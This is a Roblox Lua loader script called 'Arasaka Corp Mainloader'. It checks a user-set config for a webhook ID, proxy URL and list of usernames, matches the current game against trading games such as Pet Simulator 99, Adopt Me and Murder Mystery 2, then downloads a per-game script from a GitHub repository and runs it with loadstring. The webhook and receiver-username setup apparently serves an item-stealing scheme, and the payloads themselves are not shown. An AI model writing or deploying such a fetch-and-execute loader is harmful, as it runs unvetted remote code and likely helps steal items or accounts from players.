-- Arasaka Corp Mainloader

local Config = _G.AC_CONFIG
if not Config then
    warn("[Arasaka] No configuration found. Userloader must set _G.AC_CONFIG.")
    return
end

if not Config.WEBHOOK_ID or not Config.PROXY_URL then
    warn("[Arasaka] Invalid configuration")
    return
end

local Games = {
    [142823291] = "mm2",           -- Murder Mystery 2
    [8737899170] = "ps99",         -- Pet Simulator 99
    [16498369169] = "ps99",        -- PS99 Trading Plaza
    [17503543197] = "ps99",        -- PS99 Hardcore
    [140403681187145] = "ps99",    -- PS99 Event
    [920587237] = "adm",           -- Adopt Me
	[77747658251236] = "sp",       -- Sailor Piece
	[13772394625] = "bb",          -- Blade Ball
	[109983668079237] = "sab",     -- Brainrot (SAB)
	[97598239454123] = "gag2",     -- Grow A Garden 2 (GAG2)
	[1537690962] = "bss"           -- Bee Swarm Simulator
}

local PlaceId = game.PlaceId
local GameKey = Games[PlaceId]

if not GameKey then
    warn("[Arasaka] Game not supported:", PlaceId)
    return
end

if Config.ENABLED_GAMES and Config.ENABLED_GAMES[GameKey] == false then
    warn("[Arasaka] Game disabled in configuration:", GameKey)
    return
end

_G.USERNAMES = Config.USERNAMES or {}
_G.WEBHOOK_ID = Config.WEBHOOK_ID
_G.PROXY_URL = Config.PROXY_URL

print("[Arasaka] Loading game:", GameKey)

local ScriptBase = "https://raw.githubusercontent.com/outhackernuls090-hash/arasakacorp/refs/heads/main/"
local ScriptUrl = ScriptBase .. GameKey .. ".lua"

local Success, Result = pcall(function()
    return game:HttpGet(ScriptUrl, true)
end)

if not Success or not Result or #Result == 0 then
    warn("[Arasaka] Failed to load base game script")
else
    loadstring(Result)()
end

print("[Arasaka] Loader complete for", GameKey)
